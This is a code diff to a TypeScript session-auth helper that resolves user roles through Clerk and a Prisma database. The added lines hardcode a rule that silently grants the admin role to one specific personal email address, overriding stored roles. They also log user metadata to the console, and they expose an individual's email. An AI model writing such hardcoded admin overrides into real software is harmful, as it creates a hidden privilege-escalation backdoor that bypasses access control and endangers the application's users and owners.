@@ -54,13 +54,17 @@ export async function getSessionUser(): Promise<SessionUser | null> {
 
   const user = await currentUser();
   const roleFromMetadata = getRoleFromClerkUser(user);
+  const userEmail = user?.primaryEmailAddress?.emailAddress?.toLowerCase() ?? null;
+
+  console.log("User metadata:", user?.publicMetadata);
+
   let role = roleFromMetadata;
 
-  if (role === "guest" && user?.primaryEmailAddress?.emailAddress) {
+  if (role !== "admin" && userEmail) {
     try {
       const persistedUser = await prisma.user.findUnique({
         where: {
-          email: user.primaryEmailAddress.emailAddress.toLowerCase(),
+          email: userEmail,
         },
         select: {
           role: true,
@@ -77,6 +81,10 @@ export async function getSessionUser(): Promise<SessionUser | null> {
 
   if (role === "guest") {
     role = getRoleFromSessionClaims(authResult.sessionClaims);
+  }
+
+  if (role !== "admin" && userEmail === "peterkinuthia726@gmail.com") {
+    role = "admin";
   }
 
   return {
